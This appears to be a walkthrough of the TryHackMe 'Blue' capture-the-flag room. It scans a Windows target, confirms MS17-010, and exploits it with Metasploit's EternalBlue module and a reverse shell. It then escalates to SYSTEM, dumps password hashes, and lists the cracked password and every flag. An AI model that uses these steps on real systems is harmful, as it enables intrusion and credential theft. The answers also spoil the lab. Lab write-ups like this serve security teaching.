 Hacked Machine Blue of Tryhackme room...
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

Here how I hacked this machine

Step One To Scan Target By Using Nmap Tool:

Frist thing I did is scan all ports on network 

got 9 Ports open on machine 

so i did version scan  to check any vulnerable service is there or not

Task 1: Recon

Scan the machine. (If you are unsure how to tackle this, I recommend checking out the [Nmap](https://tryhackme.com/room/furthernmap) room)**

We run the following nmap scan:


nmap -sS -Pn -A -p- -T5 $ip


> Answer: No answer needed


How many ports are open with a port number under 1000?**

We get 3 ports opened under the port 1000.

> Answer: 3

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08–067)**

To find this we will use a nmap script to find if the machine is vulnerable:


nmap -Ss -Pn -p 445 $ip --script smb-vuln-ms17-010.nse


And we find that it is vulnerable to ms17–010:

> Answer: ms17–010

Task 2:

Exploit the machine and gain a foothold.

After That I Started A tool Name Metasploit on And search for version of 


search ms17-010


Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

exploit/windows/smb/ms17_010_eternalblue


Show options and set the one required value. What is the name of this value? (All caps for submission)

run the exploit/windows/smb/ms17_010_eternalblue then enter

Show Options


Show options and set the one required value. What is the name of this value? (All caps for submission)

Answer: RHOSTS

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`

With that done, run the exploit!

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

Task 3: Escalate

Escalate privileges, learn how to upgrade shells in metasploit.

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

Answer:post/multi/manage/shell_to_meterpreter

Select this (use MODULE_PATH). Show options, what option are we required to change?

No Answer

Set the required option, you may need to list all of the sessions to find your target here.

No  Answer

Run! If this doesn't work, try completing the exploit from the previous task once more.

No Answer

Once the meterpreter shell conversion completes, select that session for use.

No Answer

Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

NoAnswer

List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

use command 'tasklist' to list all process IDs


No Answer

Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

Task 4:Cracking

Dump the non-default user's password and crack it!

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

Answer:Jon

Copy this password hash to a file and research how to crack it. What is the cracked password?

Answer:*alqfna22*

Task 5:Find flags!

Flag1? *This flag can be found at the system root.*

Answer:*flag{access_the_machine}*

Flag2? *This flag can be found at the location where passwords are stored within Windows.*

- Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

Answer:*flag{sam_database_elevated_access}*

flag3? *This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.*

Answer:*flag{admin_documents_can_be_valuable}*
